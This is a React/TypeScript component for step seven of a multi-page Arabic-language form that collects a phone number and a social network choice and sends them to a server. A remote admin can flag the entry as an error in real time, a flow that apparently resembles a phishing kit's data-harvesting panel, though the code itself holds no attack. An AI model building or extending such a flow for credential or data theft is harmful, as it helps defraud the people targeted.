import Main from "@/components/Main";
import {
  TiSocialFacebook,
  TiSocialInstagram,
  TiSocialLinkedin,
} from "react-icons/ti";

import { Button } from "@/components/ui/button";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { MAIN_BTN } from "@/constants/data";
import { useSignals } from "@preact/signals-react/runtime";
import { useEffect, useState } from "react";
import { FieldValues, useForm } from "react-hook-form";
import PhoneInput from "react-phone-number-input";
import { useNavigate } from "react-router-dom";
import {
  currentPage,
  isAdminError,
  logo,
  mainInfo,
  sendDataToServer,
} from "../../real-time/context/signals";

function Page7() {
  useSignals();

  const { handleSubmit } = useForm({ mode: "all" });

  const [phone, setValue] = useState(mainInfo.value?.phone);

  const navigate = useNavigate();

  function sendData(data: FieldValues) {
    sendDataToServer({
      data: {
        ...data,
        phone,
        social: logo.value,
      },
      current: "page7",
      nextPage: "page8",
      waitingForAdminResponse: false,
      navigate,
    });
  }

  useEffect(() => {
    // This Step Are Necessary
    currentPage.value = "page7";
  }, []);
  return (
    <Main>
      <form
        className="flex flex-col gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <div className="flex justify-center">
          {logo.value === "facebook" ? (
            <TiSocialFacebook className="text-main text-5xl" />
          ) : logo.value === "instagram" ? (
            <TiSocialInstagram className="text-main text-5xl" />
          ) : (
            <TiSocialLinkedin className="text-main text-5xl" />
          )}
        </div>

        <div className="flex flex-col gap-2" dir="rtl">
          <span className="text-xs font-medium">رقم</span>
          <PhoneInput
            value={phone}
            // eslint-disable-next-line @typescript-eslint/ban-ts-comment
            // @ts-expect-error
            onChange={setValue}
            className={`px-2 bg-gray-100  w-full outline-none border rounded-lg relative transition-all rtl ${
              isAdminError.value ? "border-red-500" : "border-gray-300"
            }`}
          />
        </div>

        <Select
          onValueChange={(val) => (logo.value = val)}
          defaultValue="facebook"
        >
          <SelectTrigger className="w-full">
            <SelectValue placeholder="chose social" defaultValue={"facebook"} />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="facebook">facebook</SelectItem>
            <SelectItem value="instagram">instagram</SelectItem>
            <SelectItem value="linkedin">linkedin</SelectItem>
          </SelectContent>
        </Select>

        <Button className={MAIN_BTN + " w-[150px] mx-auto"}>التالي</Button>
      </form>
    </Main>
  );
}

export default Page7;
